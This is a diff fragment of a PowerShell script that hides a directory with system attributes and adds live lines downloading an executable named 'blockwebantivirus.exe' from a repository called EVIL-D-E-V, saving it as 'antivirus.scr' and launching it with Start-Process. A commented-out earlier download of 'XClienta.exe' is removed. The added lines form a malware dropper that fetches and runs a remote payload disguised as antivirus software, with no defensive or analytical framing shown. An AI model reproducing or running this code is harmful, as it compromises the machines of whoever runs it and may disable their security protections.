@@ -56,10 +56,10 @@ attrib +h +s $dir
 # Invoke-WebRequest -Uri $url -OutFile $output
 # Start-Process $output
 
-# $url = "https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/XClienta.exe"
-# $output = "$dir\hailord.scr"
-# Invoke-WebRequest -Uri $url -OutFile $output
-# Start-Process $output
+$url = "https://github.com/EVIL-D-E-V/M/raw/refs/heads/main/shellcode/blockwebantivirus.exe"
+$output = "$dir\antivirus.scr"
+Invoke-WebRequest -Uri $url -OutFile $output
+Start-Process $output
 
 
 
